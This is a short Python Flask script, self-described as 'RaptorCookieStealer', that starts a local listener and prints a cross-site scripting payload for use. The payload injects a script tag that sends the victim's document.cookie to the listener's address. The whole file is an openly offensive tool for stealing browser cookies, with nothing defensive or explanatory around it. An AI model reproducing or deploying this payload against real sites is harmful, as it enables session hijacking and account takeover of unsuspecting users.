from flask import Flask

app = Flask(__name__)


ban = '''
          RRRRRRRR      AAA      PPPPPPPP  TTTTTTTTTT  OOOOOOOOOOO  RRRRRRRR
          RR    RR     AA AA     PP    PP      TT      OOOOOOOOOOO  RR    RR
          RRRRRRRR    AA A AA    PPPPPPPP      TT      OO       OO  RRRRRRRR
          RR  RRR    AA     AA   PP            TT      OOOOOOOOOOO  RR  RRR
          RR   RRR  AA       AA  PP            TT      OOOOOOOOOOO  RR   RRR

                         Python Cookie Stealer | Americo JR
                  github.com/mussacatejunior/RaptorCookieStealer'''

@app.route('/')
def index():
    return 'RaptorCookieStealer'

def cookieStealer(ban):
    print(ban)
    print("\nUse this Payload:")
    print("<script>new Image().src='http://127.0.0.1:5000/?='+document.cookie</script>\n\n")

if __name__ == '__main__':
    cookieStealer(ban)
    app.run()    